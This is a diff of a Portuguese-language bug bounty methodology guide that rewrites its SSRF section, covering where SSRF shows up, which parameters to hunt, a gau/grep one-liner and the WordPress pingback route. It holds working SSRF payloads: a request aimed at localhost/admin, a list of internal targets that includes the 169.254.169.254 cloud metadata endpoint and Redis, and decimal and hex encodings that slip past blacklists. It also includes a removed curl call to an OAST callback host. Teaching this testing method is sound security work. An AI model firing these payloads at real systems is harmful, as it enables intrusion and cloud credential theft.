@@ -251,30 +251,60 @@ Authorization: Bearer <token_do_usuario_comum>   # <- perfil sem permissão
 
 **🐞SSRF (Server-Side Request Forgery)**
 
-*   Procure funcionalidades que fazem requisições a partir do servidor: importar imagem por URL, webhook, PDF generator, preview de link, integração com API externa
+Onde costuma aparecer? Em qualquer funcionalidade que busca uma URL pra você: webhooks, importação de imagem por URL, geradores de PDF/screenshot a partir de link, validadores de URL, integrações ("conecte sua conta"), pré-visualização de link (aquele card que aparece quando você cola um link no chat), conversores de documento, proxies de imagem, e o clássico ?url= 
+
+| Tipo | Lê a resposta? | Como Confirma |
+|------|----------|------------|
+| Basic / in-band | Sim | Conteúdo interno aparece na resposta |
+| Semi-blind | Parcial |código na linguagem da app → SO |
+| Blind |Não |  Interação OAST (DNS/HTTP no seu servidor) |
+
+<br>
+
+`Onde caçar:`
+
+*    Parâmetros óbvios: url, uri, link, src, dest, redirect, target, domain, callback, webhook, feed, host, to, out, path, continue, image, imageUrl, file, document, proxy.
+*    Funcionalidades: importar por URL, gerar PDF/thumbnail/screenshot de um link, "preview" de link, validador de URL, integrações via webhook, conectores, parsers de XML (XXE pode virar SSRF), SAML/SSO.
+*    Headers que viram destino: às vezes o servidor segue o Referer ou um header customizado.
+*    WordPress com xmlrpc.php habilitado: blind SSRF "de prateleira" via pingback.ping (detalhe no Nível 1). Fingerprint de WP antigo é forte indício de que o pingback segue exposto.
 
 ```bash
-cat all_urls_dedup.txt | gf ssrf > ssrf_candidatos.txt
+# Caçar parâmetros tipo URL nos JS e na superfície (já vimos essas ferramentas no post 01-recon-discovery.md)
+echo "https://alvo.com" | gau | grep -Ei '(\?|&)(url|uri|link|src|dest|redirect|target|callback|webhook|feed|image|file)=' | sort -u
+```
+
+<br>
+
+`Atalho:`
+
+Se o alvo roda WordPress com o pingback.ping ) xmlrpc.php habilitado (o que é comuníssimo, principalmente em versões antigas; um fingerprint de WP desatualizado já é forte indício de que o pingback segue exposto), você tem um blind SSRF pronto, sem precisar de um parâmetro ?url= 
+
+<br>
+
+`Bata em localhost:`
+
+```bash
+POST /product/stock HTTP/2
+Host: alvo.com
+Content-Type: application/x-www-form-urlencoded
+stockApi=http://localhost/admin       # <- painel que só responde "de dentro"
 ```
 
 ```bash
-# Testar com seu próprio listener (Burp Collaborator, interactsh, ou webhook.site)
-curl -X POST https://target.com/api/import -d '{"url":"http://SEU_COLLABORATOR.oastify.com"}'
-```
-
-*   Bypass de blacklist de IP interno:
-```bash
-http://127.0.0.1
-http://localhost
-http://0.0.0.0
-http://[::1]
-http://127.1
+# Variações de destino interno pra testar:
+http://127.0.0.1/             
+http://localhost/
+http://127.0.0.1:8080/        
+http://192.168.0.68/admin     
+http://[::1]/                 
+http://127.0.0.1:6379/   (Redis)
+http://10.0.0.1/
+http://169.254.169.254/latest/meta-data/  (metadata!)
 http://2130706433        (decimal de 127.0.0.1)
 http://0x7f000001        (hex de 127.0.0.1)
-http://169.254.169.254/latest/meta-data/   (cloud metadata AWS/GCP/Azure)
 ```
 
-*   Se confirmado, testar acesso a metadata de cloud (AWS/GCP/Azure) para vazamento de credenciais/IAM role
+Se o conteúdo interno voltar na resposta (basic) ou se o tempo/erro mudar (semi-blind), você está dentro da rede
 
 <br>
 
